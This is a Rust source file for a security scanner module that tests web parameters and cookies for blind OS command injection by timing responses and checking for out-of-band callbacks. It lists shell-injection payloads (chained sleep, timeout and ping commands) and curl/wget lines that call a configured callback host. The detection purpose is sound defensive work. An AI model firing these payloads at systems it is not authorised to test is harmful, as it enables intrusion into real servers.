//! Blind OS Command Injection Detection
//! Detects blind command injection using time delays and OOB callbacks.
//! Uses safe time delays to prevent denial of service while maintaining detection accuracy.

use crate::checks::Check;
use crate::findings::Finding;
use crate::http::{Request, Response};
use std::collections::HashMap;
use std::time::Instant;

/// Maximum number of blind payloads (bounded)
const MAX_BLIND_PAYLOADS: usize = 30;

/// Time delay threshold in milliseconds for blind detection
const TIME_THRESHOLD_MS: u128 = 4500;

/// Base delay for time-based payloads (seconds)
const BASE_DELAY: u8 = 5;

pub struct BlindCommandInjectionCheck {
    time_payloads: Vec<String>,
    oob_callback: Option<String>,
}

impl BlindCommandInjectionCheck {
    pub fn new(oob_callback: Option<String>) -> Self {
        let mut time_payloads = Vec::with_capacity(MAX_BLIND_PAYLOADS);
        
        // Linux time-delay payloads
        time_payloads.push(format!("; sleep {}", BASE_DELAY));
        time_payloads.push(format!("| sleep {}", BASE_DELAY));
        time_payloads.push(format!("&& sleep {}", BASE_DELAY));
        time_payloads.push(format!("`sleep {}`", BASE_DELAY));
        time_payloads.push(format!("$(sleep {})", BASE_DELAY));
        
        // Windows time-delay payloads
        time_payloads.push(format!("& timeout /t {}", BASE_DELAY));
        time_payloads.push(format!("| timeout /t {}", BASE_DELAY));
        
        // Ping-based delays (alternative)
        time_payloads.push("; ping -c 5 127.0.0.1".to_string());
        time_payloads.push("| ping -n 5 127.0.0.1".to_string());
        
        // Complex chaining
        time_payloads.push(format!("; if [ 1 -eq 1 ]; then sleep {}; fi", BASE_DELAY));
        time_payloads.push(format!("| echo 1 && sleep {}", BASE_DELAY));
        
        // OOB callback payloads (if callback configured)
        if oob_callback.is_some() {
            time_payloads.push(format!("; curl {}?cmd=injected &", oob_callback.as_ref().unwrap()));
            time_payloads.push(format!("| wget {}?cmd=injected &", oob_callback.as_ref().unwrap()));
            time_payloads.push(format!("$(curl {}?cmd=injected &)", oob_callback.as_ref().unwrap()));
        }
        
        Self {
            time_payloads,
            oob_callback,
        }
    }
    
    /// Test parameter with time-based detection
    fn test_time_based(&self, req: &Request, param_name: &str, original_value: &str) -> Option<Finding> {
        for payload in self.time_payloads.iter() {
            let mut test_req = req.clone();
            test_req.set_param(param_name, &format!("{}{}", original_value, payload));
            
            let start = Instant::now();
            
            match test_req.send_with_timeout(15000) {
                Ok(response) => {
                    let elapsed = start.elapsed().as_millis();
                    
                    if elapsed >= TIME_THRESHOLD_MS {
                        return Some(Finding::new(
                            "BLIND_COMMAND_INJECTION_TIME",
                            &format!(
                                "Parameter '{}' shows time-based blind command injection (delay: {}ms)",
                                param_name, elapsed
                            ),
                            response.url(),
                            9,
                        )
                        .with_payload(payload)
                        .with_evidence(&format!("Response delayed by {}ms", elapsed))
                        .with_remediation("Sanitize input, avoid shell execution, use strict timeouts"));
                    }
                    
                    // Check for OOB indicators in response
                    if self.detect_oob_indicators(&response) {
                        return Some(Finding::new(
                            "BLIND_COMMAND_INJECTION_OOB",
                            &format!("Parameter '{}' triggered OOB callback attempt", param_name),
                            response.url(),
                            9,
                        )
                        .with_payload(payload)
                        .with_evidence("OOB callback pattern detected")
                        .with_remediation("Block outbound connections from web processes, sanitize input"));
                    }
                }
                Err(e) => {
                    // Timeout itself can be an indicator
                    if e.to_string().contains("timeout") {
                        return Some(Finding::new(
                            "BLIND_COMMAND_INJECTION_TIMEOUT",
                            &format!("Parameter '{}' caused request timeout (possible delay injection)", param_name),
                            req.url(),
                            8,
                        )
                        .with_payload(payload)
                        .with_evidence("Request timed out after delay injection attempt")
                        .with_remediation("Implement strict server-side timeouts, sanitize all input"));
                    }
                }
            }
        }
        None
    }
    
    /// Detect OOB callback indicators in response
    fn detect_oob_indicators(&self, response: &Response) -> bool {
        let body = response.body_slice();
        
        // Look for callback confirmation patterns
        let oob_patterns = [
            b"callback received",
            b"callback successful",
            b"external connection",
            b"dns lookup",
            b"resolved to",
        ];
        
        for pattern in oob_patterns.iter() {
            if body.contains(pattern) {
                return true;
            }
        }
        
        false
    }
}

impl Check for BlindCommandInjectionCheck {
    fn name(&self) -> &'static str {
        "BlindCommandInjection"
    }
    
    fn run(&self, request: &Request) -> Vec<Finding> {
        let mut findings = Vec::new();
        
        // Test query parameters
        for (param, value) in request.query_params() {
            if let Some(finding) = self.test_time_based(request, param, value) {
                findings.push(finding);
                break;
            }
        }
        
        // Test body parameters
        if let Some(body_params) = request.body_params() {
            for (param, value) in body_params {
                if let Some(finding) = self.test_time_based(request, param, value) {
                    findings.push(finding);
                    break;
                }
            }
        }
        
        // Test cookie values (often passed to shell)
        for (cookie_name, cookie_value) in request.cookies() {
            if let Some(finding) = self.test_time_based(request, cookie_name, cookie_value) {
                findings.push(finding);
                break;
            }
        }
        
        findings
    }
    
    fn metadata(&self) -> HashMap<&'static str, &'static str> {
        let mut meta = HashMap::new();
        meta.insert("type", "blind_command_injection");
        meta.insert("severity", "critical");
        meta.insert("owasp", "A03:2021-Injection");
        meta.insert("cwe", "CWE-78");
        meta.insert("detection_method", "time_based_oob");
        meta
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_payload_bounds() {
        let check = BlindCommandInjectionCheck::new(None);
        assert!(check.time_payloads.len() <= MAX_BLIND_PAYLOADS);
    }
    
    #[test]
    fn test_oob_payloads_included() {
        let check = BlindCommandInjectionCheck::new(Some("http://callback.example.com".to_string()));
        assert!(check.time_payloads.iter().any(|p| p.contains("curl")));
        assert!(check.time_payloads.iter().any(|p| p.contains("wget")));
    }
}
